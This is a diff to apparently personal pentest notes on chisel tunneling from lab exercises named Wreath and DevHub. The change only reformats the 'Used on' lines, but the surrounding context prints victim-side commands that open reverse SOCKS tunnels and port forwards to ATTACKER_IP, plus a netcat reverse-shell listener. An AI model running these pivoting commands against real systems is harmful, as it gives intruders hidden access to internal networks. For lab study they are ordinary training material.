@@ -14,7 +14,9 @@ Fast TCP/UDP tunnel over HTTP, useful for reverse SOCKS pivots and port forwards
 ./chisel client ATTACKER_IP:15000 R:socks &
 ```
 
-Used on: **Wreath** - exposed the internal `10.200.180.0/24` network through a SOCKS5 proxy on the attacker side.
+Used on: **Wreath**
+
+exposed the internal `10.200.180.0/24` network through a SOCKS5 proxy on the attacker side.
 
 Configure `proxychains.conf` with:
 
@@ -32,7 +34,9 @@ socks5 127.0.0.1 1080
 ./chisel.exe client 10.200.180.200:16000 R:15001:10.200.180.100:80
 ```
 
-Used on: **Wreath** - exposed `10.200.180.100:80` through `10.200.180.200:15001`.
+Used on: **Wreath**
+
+exposed `10.200.180.100:80` through `10.200.180.200:15001`.
 
 ### Relay a reverse shell through an intermediate host
 
@@ -45,7 +49,9 @@ Used on: **Wreath** - exposed `10.200.180.100:80` through `10.200.180.200:15001`
 rlwrap nc -lvnp 4444
 ```
 
-Used on: **Wreath** - the GitStack host could reach the intermediate server but not Kali directly.
+Used on: **Wreath**
+
+the GitStack host could reach the intermediate server but not Kali directly.
 
 ## Notes
 
@@ -69,7 +75,9 @@ Used on: **Wreath** - the GitStack host could reach the intermediate server but 
 # Victim
 ./chisel client ATTACKER_IP:9001 R:socks &
 ```
-Used on: **DevHub** - exposed loopback-only services through a reverse SOCKS tunnel.
+Used on: **DevHub**
+
+exposed loopback-only services through a reverse SOCKS tunnel.
 
 ### Reverse port forward to JupyterLab
 ```bash
@@ -79,6 +87,8 @@ Used on: **DevHub** - exposed loopback-only services through a reverse SOCKS tun
 # Victim
 ./chisel client ATTACKER_IP:9001 R:8889:127.0.0.1:8888 &
 ```
-Used on: **DevHub** - forwarded JupyterLab from target loopback `127.0.0.1:8888` to attacker-side `localhost:8889`.
+Used on: **DevHub**
+
+forwarded JupyterLab from target loopback `127.0.0.1:8888` to attacker-side `localhost:8889`.
 
 
